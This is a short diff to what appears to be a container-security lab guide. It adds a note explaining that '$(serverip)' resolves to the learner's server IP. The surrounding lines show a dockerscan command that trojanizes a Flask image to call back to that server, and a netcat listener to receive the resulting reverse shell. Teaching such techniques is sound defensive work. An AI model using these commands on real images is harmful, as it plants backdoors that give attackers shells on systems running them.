@@ -38,6 +38,8 @@ dockerscan image modify trojanize abhaybhargav-vul_flask -l $(serverip) -p 1337 
 
 * Step 5: Run `netcat` command 
 
+>> Note: `$(serverip)` will automatically takes your server ip.
+
 ```commandline
 nc -v -k -l $(serverip) 1337
 ```
